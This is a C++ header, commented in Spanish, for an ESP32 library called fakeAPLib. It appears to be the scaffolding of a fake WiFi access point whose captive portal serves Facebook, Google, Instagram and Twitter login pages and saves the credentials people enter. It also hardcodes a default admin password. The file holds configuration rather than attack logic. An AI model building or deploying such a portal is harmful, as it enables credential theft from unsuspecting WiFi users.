#ifndef INCLUDE_H
#define INCLUDE_H

#include <Arduino.h>
#include <FS.h>
#include <SD_MMC.h>
#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiSTA.h>
#include <NetworkClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <String>
//#include <WiFiMulti.h>
//#include <UrlEncode.h>
//#include <HTTPRequest.hpp>
//#include <HTTPResponse.hpp>
//#include <memory>


namespace fakeAPLib
{
    //typedef struct ESPConfig_t;

    typedef struct Placeholder_t;

    /**
     * @brief Obtener el valor del tiempo actual.
     * 
     * @remark Hablamos del tiempo de actividad, es decir, el tiempo
     *         desde que se ha iniciado/reinicializado el ESP32.
     * 
     * @return Una cadena HH:MM:SS que representa el tiempo actual
     */
    static inline String getCurrentTime(void);

    /**
     * @brief convierte el tamaño desde bytes a la unidad correspondiente
     *        siguiendo el patrón siguiente:
     *          - B (bytes): menos de 1024 bytes
     *          - KB (Kilobytes): de 1024 bytes hasta menos de (1024 * 1024) bytes
     *          - MB (Megabytes): de (1024 * 1024) bytes hasta menos de (1024 * 1024 * 1024)
     *          - GB (Gigabytes): a partir de (1024 * 1024 * 1024)
     * 
     * @param bytes el tamaño en bytes (1 byte = 8 bits)
     * @return una cadena que representa el tamaño convertido a la unidad correspondiente
     */
    static inline String getReadableSize(const uint64_t& bytes);
}

/**
 * @brief 
 * 
 */
typedef enum
{
    ADMINPAGE = 'A',
    DATAFILE  = 'D',
    EXITPAGE  = 'E',
    INDEXPAGE = 'I'
    //LOGFILE   = 'l',
} FileType_t;

/**
 * @brief 
 * 
 */
typedef enum
{
    FACEBOOK  = 'F',
    GOOGLE    = 'G',
    INSTAGRAM = 'I',
    TWITTER   = 'T'
} Platform_t;



/**
 * @brief Estructura que contiene marcadores de posición (placeholders) para la librería FakeAPlib
 * 
 * Esta estructura define una colección de marcadores de posición estáticos utilizados para
 * reemplazar valores dinámicos en plantillas HTML y otros contenidos. Los marcadores siguen
 * el formato !{NOMBRE_MARCADOR}.
 * 
 * Los marcadores incluyen:
 * - Información del punto de acceso WiFi (SSID, IP)
 * - Estado y detalles de la conexión WiFi
 * - Información de la tarjeta SD (espacio, tipo)
 * - Rutas a archivos HTML de redes sociales
 * 
 * @note Todos los marcadores son constantes String estáticas para que que se puedan
 *       llamar sin la necesidad de crear un objeto de esta clase.
 * @see fakeAPLib
 */
typedef struct fakeAPLib::Placeholder_t
{
public:
    //static inline const String FileName        = "!{FILE_NAME}";   /**< Marcador de posición para  */
    //static inline const String FilePath        = "!{FILE_PATH}";   /**< Marcador de posición para  */
    static inline const String AccessPointSSID = "!{AP_SSID}";     /**< Marcador de posición para el nombre del punto de acceso */
    static inline const String WifiSSID        = "!{WIFI_SSID}";   /**< Marcador de posición para el nombre de la wifi */
    static inline const String WifiStatus      = "!{WIFI_STATUS}"; /**< Marcador de posición para el estado de la wifi (conectado/no conectado)*/
    static inline const String HostsConected   = "!{TOTAL_HOST}";  /**< Marcador de posición para el números de equipos conectados */
    static inline const String ServerIP        = "!{SERV_IP}";     /**< Marcador de posición para la dirección IP del servidor */
    static inline const String ClientIP        = "!{CLIENT_IP}";   /**< Marcador de posición para la dirección IP como estación wifi */
    static inline const String WiFiStrength    = "!{WIFI_SIGNAL}"; /**< Marcador de posición para la fuerza del signal de la wifi */
    static inline const String sdSize          = "!{SD_SIZE}";     /**< Marcador de posición para el tamaño de la tarjeta sd */
    static inline const String sdFreeSpace     = "!{SD_FREE}";     /**< Marcador de posición para el espacio libre en la tarjeta */
    static inline const String sdSpaceUsed     = "!{SD_USED}";     /**< Marcador de posición para el espacio utilizado en la tarjeta */
    static inline const String sdCardType      = "!{SD_TYPE}";     /**< Marcador de posición para el tipo de tarjeta */
    static inline const String FacebookPath    = "!{FB_PATH}";     /**< Marcador de posición para la ruta del archivo html de facebook */
    static inline const String GooglePath      = "!{GL_PATH}";     /**< Marcador de posición para la ruta del archivo html de google */
    static inline const String InstagramPath   = "!{IS_PATH}";     /**< Marcador de posición para la ruta del archivo html de instagram */
    static inline const String TwitterPath     = "!{TW_PATH}";     /**< Marcador de posición para la ruta del archivo html de twitter */
};


inline static String fakeAPLib::getCurrentTime()
{
    unsigned long runMillis= millis();
    unsigned long allSeconds= runMillis / 1000;
    int secsRemaining= allSeconds % 3600;

    uint8_t hours   = allSeconds / 3600;
    uint8_t minutes = secsRemaining / 60;
    uint8_t seconds = secsRemaining % 60;

    return String(hours) + ":" + String(minutes) + ":" + String(seconds);
}


inline static String fakeAPLib::getReadableSize(const uint64_t& bytes)
{
    if      (bytes < 1024)                 return String(bytes) + " B";
    else if (bytes < (1024 * 1024))        return String(bytes / 1024.0) + " KB";
    else if (bytes < (1024 * 1024 * 1024)) return String(bytes / (1024.0 * 1024.0)) + " MB";
    else                                   return String(bytes / (1024.0 * 1024.0 * 1024.0)) + " GB";
}


/**
 * * Esto se tiene que implementar más adelante
 * La idea es tener un archivo de configuración
 * 
 */
/*
typedef struct fakeAPLib::ESPConfig_t
{
public:
    static String configPath;
};
*/

using namespace fakeAPLib;


#ifndef USE_GLOBAL_VAL
#define USE_GLOBAL_VAL true
#endif

#if (USE_GLOBAL_VAL)

    #define TIME_OUT_LIMIT 20000
    #define MAX_LOGIN_TIME 150000
    #define LOGIN_LOCKOUT_TIME 300000

    #ifndef MAX_LOGIN_ATTEMPTS
    #define MAX_LOGIN_ATTEMPTS 4
    #endif

    #ifndef LOG_FILE
    #define LOG_FILE "/logs/logs.log"
    #endif

    #ifndef JSON_FILE_PATH
    #define JSON_FILE_PATH "/webpages/admin-login/filesdata.json"
    #endif

    #if !defined(ADMIN_USERNAME) && !defined(ADMIN_PASSWORD)
    #define ADMIN_USERNAME "admin"
    #define ADMIN_PASSWORD "@dmIn129"
    #endif

    #ifndef DNS_PORT
    #define DNS_PORT 53
    #endif

    #ifndef SERVER_PORT
    #define SERVER_PORT 80
    #endif

    #if !defined(SD_MMC_CMD) && !defined(SD_MMC_CLK) && !defined(SD_MMC_D0)
    #define SD_MMC_CMD 15
    #define SD_MMC_CLK 14
    #define SD_MMC_D0 2
    #endif

    #ifndef WITH_ERROR_TYPE
    #define WITH_ERROR_TYPE true
    #endif

    #ifndef WITH_SUCCESS_MESSAGE
    #define WITH_SUCCESS_MESSAGE true
    #endif

    #ifndef SERVER_SCREEN_LOGS
    #define SERVER_SCREEN_LOGS true
    #endif

    #if (WITH_ERROR_TYPE)
        #define ERROR_SD_NOT_INIT      "[ERROR] La tarjeta SD no ha sido inicializada"
        #define ERROR_SD_CARD_TYPE     "[ERROR] El tipo de tarjeta SD es incompatible"
        #define ERROR_SD_CARD_READ     "[ERROR] error en la lectura de la tarjeta"
        #define ERROR_FILE_OPEN        "[ERROR] Error al abrir el archivo: %s\n"
        #define ERROR_NO_FILE          "[ERROR] El archivo %s no existe\n"
        #define ERROR_FILE_WRITE       "[ERROR] Error al escribir en el archivo: %s\n"
        #define ERROR_FILE_RENAME      "[ERROR] Error al renombrar archivo/carpeta: %s\n"
        #define ERROR_FILE_TYPE        "[ERROR] Error de tipo de archivo/carpeta: %s\n"
        #define ERROR_FILE_DELETE      "[ERROR] Error al borrar el archivo: %s\n"
        #define ERROR_DIR_CREATE       "[ERROR] Error al crear la carpeta: %s\n"
        #define ERROR_DIR_DELETE       "[ERROR] Error al borrar la carpeta: %s\n"
        #define ERROR_WIFIAP_CREATE    "[ERROR] La creación del punto de acceso ha fallado"
        #define ERROR_WIFI_CONNECT     "[ERROR] No se pudo conectar a la red wifi %s\n"
        #define ERROR_SAVE_CREDENTIALS "[ERROR] Error al guardar las credenciales"
        #define ERROR_GENERATE_JSON    "[ERROR] Error al crear el fichero JSON"
        #define ERROR_SERVER_IMAGE     "[ERROR] Respuesta del servidor erronea"
    #endif

    #if (WITH_SUCCESS_MESSAGE)
        #define SUCCESS_SD_INIT          "[SUCCESS] Tarjeta SD inicializada correctamente"
        #define SUCCESS_FILE_OPEN        "[SUCCESS] El archivo: %s se ha leído correctamente. Tiempo: %dms\n"
        #define SUCCESS_FILE_WRITE       "[SUCCESS] El archivo: %s se ha guardado correctamente. Tiempo: %dms\n"
        #define SUCCESS_FILE_RENAME      "[SUCCESS] El archivo: %s se ha renombrado correctamente\n"
        #define SUCCESS_FILE_DELETE      "[SUCCESS] El archivo: %s se ha borrado correctamente\n"
        #define SUCCESS_DIR_CREATE       "[SUCCESS] La carpeta: %s se ha creado correctamente\n"
        #define SUCCESS_DIR_DELETE       "[SUCCESS] La carpeta: %s se ha borrado correctamente\n"
        #define SUCCESS_WIFIAP_INIT      "[SUCCESS] Punto de acceso iniciado correctamente"
        #define SUCCESS_WIFISTA_CONECT   "[SUCCESS] Se ha conectado correctamente a la red: %s\n"
        #define SUCCESS_SERVER_INIT      "[SUCCESS] Servidor iniciado correctamente"
        #define SUCCESS_APSERVER_INIT    "[SUCCESS] El servidor del punto de acceso cautivo iniciado correctamente"
        #define SUCCESS_LOG_EVENT        "[LOGS] Evento guardado correctamente"
        #define SUCCESS_SAVE_CREDENTIALS "[SUCCESS] Credenciales enviadas y guardadas correctamente"
        #define SUCCESS_GENERATE_JSON    "[SUCCESS] El archivo JSON se generó correctamente"
        //#define SUCCESS_SD_CARD_TYPE "[SUCCESS] El tipo de tarjeta es incompatible"
        //#define SUCCESS_SD_CARD_READ "[SUCCESS] en la lectura de la tarjeta"
    #endif

    #if (SERVER_SCREEN_LOGS)
        #define NEW_PAGE_REQ       "[SERVER] Nueva solicitud de pagina %s\n"
        #define NEW_WIFI_CONFIG    "[SERVER] Configuración wifi guardada"
        #define UPLOAD_STARTED     "[SERVER] Empieza la carga del archivo %s\n"
        #define NEW_ADMIN_LOGIN    "[SERVER] Nueva conexión de administrador"
        #define NEW_SOCIALS_PATH   "[SERVER] Nuevas rutas indicadas para las paginas de redes sociales."
        #define NEW_FILE_CONTENT   "[SERVER] Displaying file %s\n"
        #define NEW_FILE_DELETED   "[SERVER] El archivo %s se ha borrado correctamente\n"
        #define NEW_FILE_UPLOADED  "[SERVER] El archivo %s se ha subido al servidor\n"
        #define FAILED_FILE_UPLOAD "[SERVER] El archivo %s no se pudo subir al servidor\n"
        #define FAILED_ADMIN_LOGIN "[SERVER] Intento de connexión como admin fallado."
        #define FAILED_CREDENTIALS "[SERVER] Error al guardar las credenciales"
        #define FAILED_UNEXPECTED  "[SERVER] Ha occurido un error inesperado al subir el archivo"
    #endif

#endif //USE_GLOBAL_VAR



#endif //INCLUDE_H